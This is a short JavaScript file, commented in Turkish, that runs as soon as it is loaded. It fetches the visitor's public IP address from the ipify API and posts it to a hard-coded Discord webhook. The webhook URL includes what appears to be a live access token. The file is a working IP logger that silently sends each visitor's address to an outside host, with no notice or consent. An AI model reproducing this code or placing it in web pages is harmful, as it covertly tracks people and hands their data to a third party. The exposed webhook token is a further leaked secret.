// script.js

// ipify API'sine HTTP GET isteği gönderen fonksiyon
function getIP() {
  var request = new XMLHttpRequest();
  var url = 'https://api.ipify.org?format=json';

  request.open('GET', url, true);
  request.onreadystatechange = function () {
    if (request.readyState === 4 && request.status === 200) {
      var response = JSON.parse(request.responseText);
      var ip = response.ip;
      sendToWebhook(ip);
    }
  };
  request.send();
}

// IP adresini Discord webhookuna gönderen fonksiyon
function sendToWebhook(ip) {
  var webhookUrl = 'https://discord.com/api/webhooks/1175859434698846219/KxSVYBy75SQSwDPDa7b9-475AtgroMclVqtss0__E85cUh2pziahGNxN126wsB7tPwQi';
  var payload = {
    content: 'IP Adress: ' + ip
  };
  var request = new XMLHttpRequest();

  request.open('POST', webhookUrl, true);
  request.setRequestHeader('Content-Type', 'application/json');
  request.send(JSON.stringify(payload));
}

// IP adresini almak için fonksiyonu çağır
getIP();
